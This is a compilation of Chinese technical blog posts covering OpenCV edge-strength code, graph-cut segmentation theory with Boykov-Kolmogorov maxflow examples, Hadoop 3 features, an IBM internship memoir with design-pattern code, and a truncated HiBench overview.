					float nb = (float)inputImg.at<Vec3b>(i+si,j+sj)[0];
					float ng = (float)inputImg.at<Vec3b>(i+si,j+sj)[1];
					float nr = (float)inputImg.at<Vec3b>(i+si,j+sj)[2];

					//   ||I_p - I_q||^2  /   2 * sigma^2
					float currEdgeStrength = exp(-((b-nb)*(b-nb) + (g-ng)*(g-ng) + (r-nr)*(r-nr))/(2*varianceSquared));
					float currDist = sqrt((float)si*(float)si + (float)sj * (float)sj);

					
					// this is the edge between the current two pixels (i,j) and (i+si, j+sj)
					edgeStrength = edgeStrength + ((float)0.95 * currEdgeStrength + (float)0.05) /currDist;
					
				}
			}
			// this is the avg edge strength for pixel (i,j) with its neighbors
			showEdgesImg.at<float>(i,j) = edgeStrength;

		}
	}
	
	double maxEdge;
	Point maxPoint;
	minMaxLoc(showEdgesImg,NULL,&maxEdge, NULL, &maxPoint);
	//cout << showEdgesImg.at<float>(maxPoint) << endl;
	imshow("Edges", showEdgesImg/maxEdge);

}




/*
*******************************
Mat myMat(size(3, 3), CV_32FC2);

myMat.ptr<float>(y)[2*x]; // first channel
myMat.ptr<float>(y)[2*x+1]; // second channel
*/





测量时间的类：

#pragma once
/*
//计算代码段运行时间的类
//
*/
#include <iostream>

#ifndef ComputeTime_h
#define ComputeTime_h


class   ComputeTime    
{  
private:  
	int Initialized;  
	__int64 Frequency;  
	__int64 BeginTime;  
		    
public:  

	bool Avaliable();  
	double End();  
	bool Begin();  
	ComputeTime();  
	virtual   ~ComputeTime();    

};  






#endif


#include "ComputeTime.h"
#include <iostream>
#include <Windows.h>

ComputeTime::ComputeTime()  
{  
	Initialized=QueryPerformanceFrequency((LARGE_INTEGER   *)&Frequency);  
}  
   
 ComputeTime::~ComputeTime()  
{  
		    
}  
   
 bool   ComputeTime::Begin()  
{  
	if(!Initialized)  
		return 0;

	 return   QueryPerformanceCounter((LARGE_INTEGER   *)&BeginTime);  
 }
     
 double   ComputeTime::End()
{  
	 if(!Initialized)  
		return 0;

		   
	 __int64   endtime;  
		   
	 QueryPerformanceCounter((LARGE_INTEGER   *)&endtime);  
		    
		  
	 __int64   elapsed = endtime-BeginTime;  
		    
		  
	 return   ((double)elapsed/(double)Frequency)*1000.0;  //单位毫秒
 }  

 bool   ComputeTime::Avaliable()
{  
	 return Initialized;  
}   








项目主页：
http://vision.csd.uwo.ca/code/
 
Code：http://vision.csd.uwo.ca/wiki/vision/upload/7/77/OneCutWithSeeds_v1.03.zip
Paper：http://www.csd.uwo.ca/~ygorelic/iccv13_one_cut.pdf
 
OpenCV代码实现grabcut：：
http://www.morethantechnical.com/2010/05/05/bust-out-your-own-graphcut-based-image-segmentation-with-opencv-w-code/

我调试好的工程代码下载链接：点击打开链接






Graph Cut and Its Application in Computer Vision
 
原文出处：
http://lincccc.blogspot.tw/2011/04/graph-cut-and-its-application-in.html
现在好像需要代理才能访问了。。。
 
 

网络流算法最初用于解决流网络的优化问题，比如水管网络、通信传输和城市的车流等。Graph cut作为其中一类最常见的算法，用于求解流网络的最小割，即寻找一个总容量最小的边集合，去掉这个集合中的所有边将阻断这个网络。图像和视频也能被视作网络（或者MRF），以像素作为节点，具体应用定义相邻像素间边的能量值（容量）。因此从九十年代末开始，Graph
 cut渐渐被引入计算机视觉、图像处理和机器学习领域，用于优化分类、分割和合成等问题。
The Max-Flow and Min-Cost Problem： 定义图（或者流网络）G = (V, E)，可以为有向图或无向图。图中所有的边 e(u,
 v) ∈ E 附有一个非负的容量 c(u, v) ≥ 0，即该边所能承受的最大流量。图中通常定义两个特殊的节点，源点 s 和终点 t；存在拥有多个端点的图，对其的Max-flow求解为NP问题，需要转化为双端点问题求解次优解。定义满足以下条件的 f
 : VXV → R 为图 G 上的流：   ●  Capacity Constrain，对于所有 u, v ∈ V，f(u,
 v) ≤ c(u, v)   ●  Skew Symmetry，对于所有 u, v ∈ V，f(u,
 v) = ﹣f(u, v)   ●  Flow Conservation，对于所有 u ∈ V﹣{s, t} 和 v
 ∈ V，∑ f(u, v) = 0从 s 出发的所有流量的总和就是整个图的总流量。如下图所示，图的当前总流量为19，没有达到最大值。 Cut（割）将整个图的所有节点分为两个不相交的集合 S 和 T，比如s
 ∈ S，t ∈ T。割的容量定义为：     c(S, T) = ∑x∈S ∑y∈T c(x, y)。Min-cut（最小割）就是图的所有割中容量最小的一个。算法上要直接找Min-cut是十分困难的，根据最大流最小割定理，即图的最大流量等于图的最小割容量，通常要将问题转化为与之等价的Max-flow问题（理论推导点我）。
Max-Flow and Min-Cost Algorithms：Max-flow问题的求解有两类经典的算法，增广路径[1] 和Push-relabel [2]。增广路径类算法遵循循序渐进的原则，不断在图上查找从 s 到 t 的可用路径，从0开始慢慢地提升图的总流量至最大；而Push-relabel类算法则从局部出发，总是尽可能地向图中输送更多的流量，在不断重复的Push和Relabel操作中达到节点间的平衡，是水流的一种拟态。Push-relabel类算法具有较高的并行性，适用于GPU加速，大体流程点我。增广路径类算法有很多衍生，但大多具有以下特性：1）维护残余容量网络；2）通过寻找Augmenting path逼近最大流。Augmenting path具有形式：s, e1, v1, e2, v2, … , ek, t，其中没有重复的节点、没有饱和的前向边和空流量的后向边。对残余网络的定义有很多形式，这里我们定义边的残余容量（Redsidual
 capacity，RC）当其为前向边时等于 c(i, j) – f(i, j)，当其为后向边时等于 f(i, j)，如下图所示。
 
Augmenting path的残余容量为其每条边残余容量的最小值，如上图路径的残余容量为1。Ford-Fulkerson算法不断在残余网络中查询Augmenting path，比如使用广度或深度优先搜索，直到再也找不到任何路径。例子点我。Boykov[3]
 提出一种双向搜索并重用搜索树的增广路径算法，虽然理论复杂度较高，但在实际应用中却效率较高，因此很多需要Graph cut的应用都采用Boykov提供的源代码。
Applications in Computer Vision：计算机视觉中很多问题，都可以归结为量化方程的优化问题。比如图像分割的问题，定义每一个像素属于前景或背景的可能性度量，那整个问题就变成了如何让整个可能性量化方程取值最大的问题。当然有时，我们还需要定义平滑项，用于约束相邻像素的属性变化。这就形成了在视觉中最为常见的一类能量优化方程：      E(f) = Esmooth(f) + Edata(f)
1维图还可用动态规划方法求解，但2维以上由于其几何级的复杂度增长，则大多使用Graph cut。典型的应用有Segmentation、Stereo matching、Image Restoration、Motion estimation等。根据不同的应用有不同的图构、相邻约束和能量函数。Kolmogorov[4] 研究了什么样的能量方程能用Graph cut优化，并提出了三元及以下能量函数自动转换成图的方法。
Multi-label Graph Cut：根据应用的需要，有时定义的图构是多个label的，也就是有多个灭点，如下图所示。这种图的Min-cut是Multi-way的，求解过程是一个NP问题（Boykov[3]在他的论文中有详细证明）。比如Stereo matching中的disparity、Image Restoration中的intensity等，其本质都是一个Multi-label的优化问题。虽然有些方法可以将其人为地转变为2-label，但这在很大程度上限制了能量函数的定义。

 


 

Boykov[3]提出了两种算法，能够在多项式时间内逼近Muli-label问题的最优解，并给出了详细证明和两种算法的optimality property讨论。这是一篇值得细读的文章。这两种方法都是在寻找Local minima，最终使得图中的任意一个像素改变其label都不能产生更好的解。在每一次迭代中，两种方法分别进行 α-expansion 和 α-β-swap 形式的move
 优化。α-expansion move 是指扩展 α-label 区域，使原本其他 label 的点属于 α；α-β-swap move 则只针对 α-label 和 β-label 区域，使其中的一些点的label从 α 变为 β 或相反。每一部迭代都是一次2-label的优化过程，形成以 α 和 非α 为灭点、以及以 α 和 β 为灭点的图，寻找最优cut，重整label，不断逼近最优解。α-expansion 要求平滑项满足三边定理，而 α-β-swap 可用于任意平滑项定义；但 α-expansion 有严格的optimality
 property bound，总不会产生太坏的结果，因此被较多地使用。



Dynamic Graph Cut：动态图指一个图序列，在时序上前后图直接会保持平滑的过渡，因此，是否可以在前一张图的residual graph基础上修改变化了的像素点的能量以快速地求解？Dynamic graph cut并不寻求最优解，而是次优的快速的解。Kohli[12] 使用重新参数化图（Graph Reparameterization）的方法修改动态变化的数值，并保持Capacity、Flow等基本约束，而后直接得到次优解。这种方法可以容忍少量边的修改和少量任意节点拓扑的重构，但是和其他所有Dynamic
 graph cut算法一样，以少量、也就是轻微的时序变化为前提。主要应用于视频相关的视觉方法，如Video segmentation。
 
 
 

 
 
Bibliography：[1] L. Ford , D. Fulkerson. Flows in Networks. Princeton University Press, 1962.
[2] Andrew V. Goldberg, Robert E. Tarjan. A new approach to the maximum-flow problem. In Journal of the Association for Computing Machinery, 35(4):921–940, October 1988.
[3] Y. Boykov, V. Kolmogorov. An Experimental Comparison of Min-Cut/Max-Flow Algorithms for Energy Minimization in Vision. In IEEE Transactions on Pattern Analysis and Machine
 Intelligence (PAMI), volume 26, page 1124-1137, 2004.
[4] V. Kolmogorov, R. Zabih. What Energy Functions Can Be Minimized via Graph Cuts? In IEEE Transactions on Pattern Analysis and Machine Intelligence (PAMI), volume 26, no.2,
 page 147-159, 2004.
[5] V. Kolmogorov, R. Zabih. Multi-camera Scene Reconstruction via Graph Cuts. In European Conference on Computer Vision (ECCV), May 2002 (best paper).
[6] Y. Boykov, O. Veksler and R. Zabih. Faster approximate energy minimization via graph cuts. In IEEE Transactions on Pattern Analysis and Machine Intelligence (PAMI), volume
 23, no. 11, page 1-18, 2001.
[7] S. Roy, I. Cox. A maximum-flow formulation of the n-camera stereo correspondence problem. In International Conference on Computer Vision (ICCV), 1998.
[8] V. Vineet, P. J. Narayanan. CUDA Cuts: Fast Graph Cuts on the GPU. In: CVPR Workshop on Visual Computer Vision on GPUs, 2008.
[9] V. Kwatra, A. Schodl, I. Essa, G. Turk and A. Bobick. Graphcut Textures: Image and Video Synthesis Using Graph Cuts. In SIGGRAPH 2003, pp. 277-286.
[10] A. Blum, J. Lafferty, M.R. Rwebangira and R. Reddy. Semi-Supervised Learning Using Randomized Mincuts. In Proceedings of the 21st International Conference on Machine Learning
 (ICML), Banff, Canada 2004.
[11] S. Z. Li, Markov Random Field Modeling in Computer Vision, Springer Verlag, 1995.
[12] P. Kohli and P. H. S. Torr. Dynamic graph cuts for efficient inference in markov random fields. IEEE Trans. Pattern Anal. Mach. Intell. (PAMI), 29(12):2079–2088, 2007.






 
 
 
    进行了一段时间的论文学习后，现在下载了一些代码，准备从OpenCV跟matlab两个方面着手搭建自己的图像分割平台，计划耗时一个月左右的时间！
昨天去西工大，听了一场Graph Asia的报告，里面有个Microsoft的人讲述自己怎么写paper。纠正了我一直以来的一个误区：就是做完实验再写paper，这个是不对的，应该像软件工程的开发流程一样，文档先行才对，一遍写文档一边写代码。
还有一点感悟就是，关于图像分割这块的内容，大家都做的比较多了，怎么样让自己的工作出彩，还有原创性的idea很重要。
 
图论方法的主要思想是将图像映射成加权图,把图像像素看作图的顶点, 邻接像素之间的关系看作图的边, 邻接像素之间的相似性看作边的权值, 根据边的权值设计能量函数,
通过最小化能量函数完成对图的分割, 从而实现图像分割. 基于图论的分割方法对图像进行分割时优点明显:

1) 图论是一门研究比较早而且已经发展成熟的学科, 具有较好的数学基础. 针对某个问题, 图论中有多个方法可以解决;

2) 图像和图之间非常相似. 在图像映射为图之后, 便可以利用图论中的各种理论和数学工具进行图像分割.

 
目前常用的基于图论的分割方法包括最小割 (通常称为图割)、归一化割等. 和图割相比, 归一化割存在以下几点不足：
1) 没有嵌入一元 (Unary) 项, 如各自图结点的先验, 相当于对所有结点都是零先验;

2) 需要计算大矩阵的广义特征向量, 尽管采取了复杂度抑制措施, 计算量仍很大；
3) 只能逼近全局最优解; 
4) 倾向于分割出的类具有相同的类内相似度. 
 
因此, 尽管图割容易分离出小目标, 但图割方法的优点更加明显：
1) 在全局最优的框架下进行分割, 保证了能量函数的全局最优解;
2) 同时利用了图像的像素灰度信息和区域边界信息, 分割效果好;

3) 用户交互简单且方便, 只需在目标内部和背景区域标记少量的种子点, 对种子点的具体位置也没有严格要求, 而且通过预处理方法自动确定种子点, 也可让图割方法自动化.

 
因此, 近 10 年来, 基于图割的图像分割方法的发展和应用尤为广泛. 经典的图割只能精确求解特定的能量函数, 而对其他能量函数需要用线性规划松弛方法来求解, 有两个思路可实现:

1) 基于移动制造的方法, 包括 α 扩展和 α−β 交换等, 不试图精确地求解松弛问题;

2) 基于消息传递的方法, 包括信念传播 (Belief propagation) 和 TRW (Tree-reweightedmessage-passing) 等, 试图精确地求解松弛问题.
 
参考文献[7]中证明了，最小割等价于能量函数最小化：

 
 
 
 
 
 
 
 
参考文献
[1] Y. Boykov, and M. P. Jolly, "Interactive graph cuts for optimal boundary and region segmentation of objects in N-D images",
Proceeding of IEEE International Conference on Computer Vision, 1:105~112, July 2001.
[2] C. Rother, A. Blake, and V. Kolmogorov, "Grabcut – interactive foreground extraction using iterated graph cuts",
Proceedings of ACM SIGGRAPH 2004, 23(3):307~312, August 2004.
[3] A. Agarwala, M. Dontcheva, M. Agrawala, et al, "Interactive digital photomontage",
Proceedings of ACM SIGGRAPH 2004, 23(3):294~302, August 2004.
[4] Y. Li, J. Sun, C. Tang, et al, "Interacting with images: Lazy snapping",
Proceedings of ACM SIGGRAPH 2004, 23(3):303~308, August 2004.
[5] A. Blake, C. Rother, M. Brown, et al, "Interactive Image Segmentation using an adaptive GMMRF model".
Proceedings of European Conference on Computer Vision, pp. 428~441, May 2004.
[6] V. Kwatra, A. Schodl, I. Essa, et al, "Graphcut Textures: Image and Video Synthesis Using Graph Cuts".
Proceedings of ACM Siggraph 2003, pp.277~286, Augst 2003.
[7] Song-Tao L I U, Fu-Liang Y I N. 基于图割的图像分割方法及其新进展[J]. 自动化学报, 2012, 38(6): 911-922.
 






 
 图割论文大合集下载：
http://download.csdn.net/detail/wangyaninglm/8292305
 
代码：
/* graph.h */
/* Vladimir Kolmogorov (vnk@cs.cornell.edu), 2001. */

/*
	This software library is a modification of the maxflow algorithm
	described in

	An Experimental Comparison of Min-Cut/Max-Flow Algorithms
	for Energy Minimization in Computer Vision.
	Yuri Boykov and Vladimir Kolmogorov.
	In Third International Workshop on Energy Minimization
	Methods in Computer Vision and Pattern Recognition, September 2001

	This algorithm was originally developed at Siemens.
	The main modification is that two trees are used for finding
	augmenting paths - one grows from the source and the other
	from the sink. (The original algorithm used only the former one).
	Details will be described in my PhD thesis.

	This implementation uses an adjacency list graph representation.邻接链表
	Memory allocation:
		Nodes: 22 bytes + one field to hold a residual capacity
		       of t-links (by default it is 'short' - 2 bytes)
		Arcs: 12 bytes + one field to hold a residual capacity 剩余容量
		      (by default it is 'short' - 2 bytes)
	(Note that arcs are always added in pairs （弧都是成对的添加）- in forward and reverse directions)

	Example usage (computes a maxflow on the following graph):

		        SOURCE
		       /       \
		     1/         \2
		     /      3    \
		   node0 -----> node1
		     |   <-----   |
		     |      4     |
		     \            /
		     5\          /6
		       \        /
		          SINK

	///////////////////////////////////////////////////

	#include <stdio.h>
	#include "graph.h"

	void test_maxflow()
	{
		Graph::node_id nodes[2];
		Graph *g = new Graph();

		nodes[0] = g -> add_node();
		nodes[1] = g -> add_node();
		g -> set_tweights(nodes[0], 1, 5);
		g -> set_tweights(nodes[1], 2, 6);
		g -> add_edge(nodes[0], nodes[1], 3, 4);

		Graph::flowtype flow = g -> maxflow();

		printf("Flow = %d\n", flow);
		printf("Minimum cut:\n");
		if (g->what_segment(nodes[0]) == Graph::SOURCE)
			printf("node0 is in the SOURCE set\n");
		else
			printf("node0 is in the SINK set\n");
		if (g->what_segment(nodes[1]) == Graph::SOURCE)
			printf("node1 is in the SOURCE set\n");
		else
			printf("node1 is in the SINK set\n");

		delete g;
	}

	///////////////////////////////////////////////////
*/

 
 
void test_maxflow()
{
	Graph::node_id nodes[2];
	Graph *g = new Graph();

	nodes[0] = g -> add_node();
	nodes[1] = g -> add_node();
	g -> set_tweights(nodes[0], 3, 3);
	g -> set_tweights(nodes[1], 3, 1);
	g -> add_edge(nodes[0], nodes[1], 1, 0);

	Graph::flowtype flow = g -> maxflow();

	printf("Flow = %d\n", flow);
	printf("Minimum cut:\n");
	if (g->what_segment(nodes[0]) == Graph::SOURCE)
		printf("node0 is in the SOURCE set\n");
	else
		printf("node0 is in the SINK set\n");
	if (g->what_segment(nodes[1]) == Graph::SOURCE)
		printf("node1 is in the SOURCE set\n");
	else
		printf("node1 is in the SINK set\n");

	delete g;
}

 
 

 
 
这块主要就是要理解，什么是maxflow，以及节点最后分割的类型是SOURCE还是SINK分别意味着什么
 
graphcuts算法时间复杂度与其他最大流算法的比较：

 
 
 
添加几篇文章地址：
 
graphcuts资料博客大合集
http://vision.csd.uwo.ca/code/
 
http://lincccc.blogspot.tw/2011/04/graph-cut-and-its-application-in.html
http://blog.csdn.net/zouxy09/article/details/8532106
http://lincccc.blogspot.tw/2011/03/cuda-cuts-fast-graph-cuts-on-gpu_03.html
http://blog.csdn.net/hebby06/article/details/5341228







1.概述　　目前从Hadoop官网的Wiki来看，稳定版本已经发行到Hadoop2.9.0，最新版本为Hadoop3.1.0，查阅JIRA，社区已经着手迭代Hadoop3.2.0。那么，今天笔者就带着大家来剖析一下Hadoop3，看看它给我们带来了哪些新特性。2. 内容　　从功能上来说，Hadoop3比Hadoop2有些功能得到了增强，具体增加了哪些，后面再讲。首先，我们来看看Hadoop3主要带来了哪些变化：JDK：在Hadoop2时，可以使用JDK7，但是在Hadoop3中，最低版本要求是JDK8，所以低于JDK8的版本需要对JDK进行升级，方可安装使用Hadoop3EC技术：Erasure Encoding 简称EC，是Hadoop3给HDFS拓展的一种新特性，用来解决存储空间文件。EC技术既可以防止数据丢失，又能解决HDFS存储空间翻倍的问题YARN：提供YARN的时间轴服务V.2，以便用户和开发人员可以对其进行测试，并提供反馈意见，使其成为YARN Timeline Service v.1的替代品。优化Hadoop Shell脚本重构Hadoop Client Jar包支持随机ContainerMapReduce任务级本地优化支持多个NameNode部分默认服务端口被改变支持文件系统连接器DataNode内部添加了负载均衡重构后台程序和任务对管理下面，笔者就为大家来一一剖析这些新特性的具体内容，其内容包含JDK版本、EC技术、YARN的时间轴服务这三类特性，其他特性笔者在后面的博客再为大家慢慢剖析。2.1 JDK　　在Hadoop 3中，所有的Hadoop JAR包编译的环境都是基于Java8来完成的，所有如果仍然使用的是Java 7或者更低的版本，你可能需要升级到Java 8才能正常的运行Hadoop3。如下图所示： 2.2 EC技术　　首先，我们先来了解一下什么是Erasure Encoding。如下图所示：　　一般来说，在存储系统中，EC技术主要用于廉价磁盘冗余阵列，即RAID。如上图，RAID通过Stripping实现EC技术，其中逻辑顺序数据（比如：文件）被划分成更小的单元（比如：位、字节或者是块），并将连续单元存储在不同的磁盘上。　　然后，对原始数据单元的每个Stripe，计算并存储一定数量的奇偶校验单位。这个过程称之为编码，通过基于有效数据单元和奇偶校验单元的解码计算，可以恢复任意Stripe单元的错误。当我们想到了擦除编码的时候，我们可以先来了解一下在Hadoop2中复制的早期场景。如下图所示：　　HDFS默认情况下，它的备份系数是3，一个原始数据块和其他2个副本。其中2个副本所需要的存储开销各站100%，这样使得200%的存储开销，会消耗其他资源，比如网络带宽。然而，在正常操作中很少访问具有低IO活动的冷数据集的副本，但是仍然消耗与原始数据集相同的资源量。　　对于EC技术，即擦除编码存储数据和提供容错空间较小的开销相比，HDFS复制，EC技术可以代替复制，这将提供相同的容错机制，同时还减少了存储开销。如下图所示：　　EC和HDFS的整合可以保持与提供存储效率相同的容错。例如，一个副本系数为3，要复制文件的6个块，需要消耗6*3=18个块的磁盘空间。但是，使用EC技术（6个数据块，3个奇偶校验块）来部署，它只需要消耗磁盘空间的9个块（6个数据块+3个奇偶校验块）。这些与原先的存储空间相比较，节省了50%的存储开销。　　由于擦除编码需要在执行远程读取时，对数据重建带来额外的开销，因此他通常用于存储不太频繁访问的数据。在部署EC之前，用户应该考虑EC的所有开销，比如存储、网络、CPU等。2.3 YARN的时间线V.2服务 　　Hadoop引入YARN Timeline Service v.2是为了解决两个主要问题：提高时间线服务的可伸缩性和可靠性；通过引入流和聚合来增强可用性　　下面首先，我们来剖析一下它伸缩性。2.3.1  伸缩性　　YARN V1仅限于读写单个实例，不能很好的扩展到小集群之外。YARN V2使用了更具有伸缩性的分布式体系架构和可扩展的后端存储，它将数据的写入与数据的读取进行了分离。并使用分布式收集器，本质上是每个YARN应用的收集器。读则是独立的实例，专门通过REST API服务来查询2.3.2  可用性　　对于可用性的改进，在很多情况下，用户对流或者YARN应用的逻辑组的信息比较感兴趣。启动一组或者一系列的YARN应用程序来完成逻辑应用是很常见的。如下图所示：2.3.3 架构体系 　　YARN时间线服务V2采用了一组收集器写数据到后端进行存储。收集器被分配并与它们专用的应用程序主机进行协作，如下图所示，属于该应用程序的所有数据都被发送到应用程序时间轴的收集器中，但是资源管理器时间轴收集器除外。 　　 　　对于给定的应用程序，应用程序可以将数据写入同一时间轴收集器中。此外，为应用程序运行容器的其他节点的节点管理器，还会向运行应用程序主节点的时间轴收集器写入数据。资源管理器还维护自己的时间手机线收集器，它只发布YARN的通用生命周期事件，以保持其写入量合理。时间的读取器是单独的守护进程从收集器中分离出来的，它旨在服务于REST API查询操作。3.总结　　本篇博客先给大家剖析前面几个特性，其内容由JDK的版本升级、EC技术的作用及优势、YARN的时间轴V2版本的主要作用。Hadoop3后面的几个特性，在下一篇博客为大家再剖析。4.结束语　　这篇博客就和大家分享到这里，如果大家在研究学习的过程当中有什么问题，可以加群进行讨论或发送邮件给我，我会尽我所能为您解答，与君共勉！作者：哥不是小萝莉 ［关于我］［犒赏］出处：http://www.cnblogs.com/smartloli/转载请注明出处，谢谢合作！










 
2015过完年，我知道导师要出国了，自己也算是水了一个idea 的论文。希望研二能找个实习，早听说西安IBM这边有学长在里面实习过，2月底联系了一下简历就塞了过去。面试就在锦业一路软件园他们上班的地方，一去就给20分钟写了个汉诺塔。 

void hanoi(int n , char A , char B , char C)
{
if(1 == n) //最简单的情况，终止递归的条件
    {
    printf("移动%c柱上第1个到%c\n",A , C);
    }
    else
    {
       hanoi(n-1 , A , C , B); //先将源柱子上的n-1个盘子移到中间介质上
       printf("移动%c柱上第%d个到%c\n",A , n , C); //然后将源柱子上的第n个移到目标柱上
       hanoi(n-1 , B , A , C); //下面再将中间柱子上的n-1个盘子作为一个新的汉诺塔问题解决

    }
}

 
    之后两位师傅针对博客和做过的项目有针对性的问了一些问题，期间基本是我跟柳哥两个人互动，刘哥没怎么说话，还以为他是领导哈哈。面试就这么有惊无险的完了。最后柳哥还一直送我到楼下，后来三月底收到了柳哥确认的电话，导师也出国了，于是我开开心心的开启了世界五百强的实习旅途。
 
     后来找工作面试的时候有人问我你觉的IBM这个公司怎么样？实习的时候带我的师傅说过一句话，从政治经济学角度上讲IBM是生产生产工具的公司，我们为世界其他500强提供完整系统的技术解决方案和平台。当然我不能这么回答面试官，我一般就说IBM拥有一定的技术壁垒，她们的产品非常成熟，开发人员工作量不是很大，当然这种情况在我国的软件公司逐渐赶超的情况下会慢慢改变，华为联想神州数码等国内公司在与IBM重合的业务上已经对他们造成了很大冲击。 

实习过程主要做了三件事情：（有四点收获）

1.学习 SPSS DATA COLLECTION产品 
    正式上班的首要任务是进行环境搭建和安全培训，这里高大上的工作环境（邓菊说参观过bat都没这块地方大），连上厕所洗手的水都是加热过的处处彰显着蓝色巨人百年老店的逼格。每天的工作从开机到进入nodes看邮件，需要相继输入硬盘密码，开机密码，nodes密码等等。 
 
之后的一周左右的时间进行产品方面的培训。 
概况来说：我们的产品是一个完整的技术平台，提供对整个调研生命周期的支持。产品强大到支持脚本语言来写调查问卷 
 
Author设计问卷的界面： 


 
 server激活调查问卷：（我后期的工作主要是和server打交道） 


 
  组里几个师傅写的： 
 
http://www.ibm.com/developerworks/cn/data/library/techarticle/dm-1202huangq/
 
2.为组内DC-watch添加一项生成hotfix readme的功能模块
 
  DC-watch是leader自学了python 的django框架自己开发的一个查看组内所有人工作量的web平台，针对上述所有产品的hotfix，动态跟踪每个人的工作量，非常的简单高效，用饼状图柱状图，开会的时候一幕了然的知道每个人每周都修了多少bug，请了几天假，开了多少小时的会。 
 
    我们这项任务 的需求来源于，组内产品的hotfix都需要配置一个固定格式的readme.txt文件。之前全部是手写，为了减少工作量，考虑讲这块的内容继承到DC-watch中，只需要填写或者首选一些下拉菜单就可以实现在服务器端生成readme.txt并返回本地。

django是一个非常典型的MVC框架，使用django我们可以在几分钟内创建高品质，易维护，数据库驱动的应用程序。这个过程温习了一下web开发的基础知识，说实话很久不搞了post和get有啥区别都不是很清楚。
 
  后来的一件事颠覆了我对web框架的理解，有一次和桂林同学讨论怎么为DataTable上添加hotfix数据，我理所当然的认为应该写SQL语句结合游标一条一条读出来放到表上展现出来就行了。后来manager review code直接指出Django 的ORM( 关系映射模型)用类来描述数据库，采用直接操作对象的方式来操作数据库，完全避免了费劲的SQL语句，非常的简单高效，这是一次对于web认识的更新，整个实习过程中这样颠覆性的观念更新还有很多，每次更新都让我的开发经验上了一个新的台阶。 
 
 Django项目： 
https://www.djangoproject.com 
 在线文档： 
https://docs.djangoproject.com/en/1.8/ 
 中文文档： 
http://docs.30c.org/djangobook2/ 

3.设计模式的实用性
 
设计模式平时我们用的比较少，23种设计模式中朗朗上口的就那么几个，适配器，单例模式，工厂，抽象工厂，观察者 
实习的时候组内希望将产品实验性的移植到移动端，利用本身server产品具有的webservice，将调查问卷的数据载体xml请求回来，放在iPhone上通过c++解析并将对象交给object c++，最后交给swift进行展示。
下面看一下tinyxml2解析xml中使用的vistor模式 
tinyxml2在线文档： 
http://www.grinninglizard.com/tinyxml2docs/index.html
 
访问者模式就是表示一个作用于某对象结构中的各元素的操作。它使你可以在不改变各元素的类的前提下定义作用于这些元素的新操作。 
抽象访问者（Visitor）角色：声明了一个或者多个访问操作，形成所有的具体元素角色必须实现的接口。 
具体访问者（ConcreteVisitor）角色：实现抽象访问者角色所声明的接口，也就是抽象访问者所声明的各个访问操作。 
抽象节点（Element）角色：声明一个接受操作，接受一个访问者对象作为一个参量。 
具体节点（ConcreteElement）角色：实现了抽象元素所规定的接受操作。 
结构对象（ObiectStructure）角色：有如下的一些责任，可以遍历结构中的所有元素；如果需要，提供一个高层次的接口让访问者对象可以访问每一个元素；如果需要，可以设计成一个复合对象或者一个聚集，如列（List）或集合（Set）。 
 XMLDocument doctest;
 doctest.LoadFile("QuestionXML.xml");
 if(doctest.ErrorID()!=0)
 {
  cout<<doctest.ErrorID()<<endl;
  cout<<"error"<<endl;
 }
 XMLElement* titleElement = doctest.FirstChildElement("Questions");
XMLPrinter printer;
    titleElement->Accept( &printer );

   const char* xmlcstr = printer.CStr();
   cout<<xmlcstr<<endl;

输出情况： 

类图： 

 
访问者模式最合适的使用情况是需要对一个家族的对象逐个访问，并根据具体的的对象做出不同的操作，而且不希望改变原来的对象。当然在设计的时候需要让家族成员定义一个支持访问者模式的接口 
元素对象的accept函数：用visitor依次访问每个元素（一整个家族，包括很多的node） 
 
bool XMLElement::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    if ( visitor->VisitEnter( *this, _rootAttribute ) ) {
        for ( const XMLNode* node=FirstChild(); node; node=node->NextSibling() ) {
            if ( !node->Accept( visitor ) ) {
                break;
            }
        }
    }
    return visitor->VisitExit( *this );
}

 
文档类对象的accept函数：用visitor依次访问每个元素 
 
bool XMLDocument::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    if ( visitor->VisitEnter( *this ) ) {
        for ( const XMLNode* node=FirstChild(); node; node=node->NextSibling() ) {
            if ( !node->Accept( visitor ) ) {
                break;
            }
        }
    }
    return visitor->VisitExit( *this );
}

 
 
 
Accept a hierarchical visit of the nodes in the TinyXML-2 DOM. Every node in the XML tree will be conditionally visited and the host will be called back via the XMLVisitor interface. 
This is essentially a SAX interface for TinyXML-2. (Note however it doesn’t re-parse the XML for the callbacks, so the performance of TinyXML-2 is unchanged by using this interface versus any other.) 
 
The interface has been based on ideas from: 
http://www.saxproject.org/ 
http://c2.com/cgi/wiki?HierarchicalVisitorPattern 
Which are both good references for “visiting”. 
An example of using Accept():
XMLPrinter printer;
tinyxmlDoc.Accept( &printer );
const char* xmlcstr = printer.CStr();
Implements tinyxml2::XMLNode.

 
4.优雅的（elegant）设计与算法 
在第三部分我说了这个项目的语言调用设计是这样的：swift–>object c++–>c++ 
那么如果需要添加一个功能，就需要至少改动三个文件（模块）的代码，这样的设计明显耦合度太高，如何降低代码的耦合度？ 
整个过程采用敏捷开发，基本上两周一个版本，那么如何避免重构代码带来的灾难呢？ 
 
这就要降低耦合度，面相接口编程： 
1.少使用继承，多使用接口隐藏实现细节 
2.模块的功能划分尽可能单一 
3.遵循一个定义只在一个地方出现 
4.少使用全局变量 
5.类的属性和方法的声明少使用public，多使用private 
6.多使用设计模式，比如mvc 
7.尽量不用硬编码写程序，同时也尽量避免直接使用SQL
 
将近6个月的实习让我对软件开发的理解产生了很多颠覆性的观点，也让我认识到了IBM很多技术的强大，终有一天中国的软件公司也会走向全世界，这就要靠我们共同的努力啦。 









1.HiBench算法简介
Hibench 包含9个典型的hadoop负载（micro benchmarks,hdfs benchmarks,web search bench marks,machine learning benchmarks和data analytics benchmarks）
具体参考CDH集群安装&测试总结：第三节内容

micro benchmarks 
Sort:使用hadoop randomtextwriter生成数据，并对数据进行排序。 
Wordcount:统计输入数据中每个单词的出现次数，输入数据使用hadoop randomtextwriter生成。 
TeraSort：输入数据由hadoop teragen产生，通过key值进行排序。
hdfs benchmarks 
增强行的dfsio：通过产生大量同时执行读写请求的任务测试hadoop机群的hdfs吞吐量
web search bench marks 
Nutch indexing:大规模收索引擎，这个是负载测试nutch（apache的一个开源搜索引擎）的搜索子系统，使用自动生成的web数据，web数据中的连接和单词符合zipfian分布（一个单词出现的次数与它在频率表的排名成反比） 
Pagerank:这个负载包含在一种在hadoop上的pagerank的算法实现，使用自动生成的web数据，web数据中的链接符合zipfian分布。（对于任意一个term其频度（frequency）的排名（rank）和frequency的乘积大致是一个常数）
machine learning benchmarks 
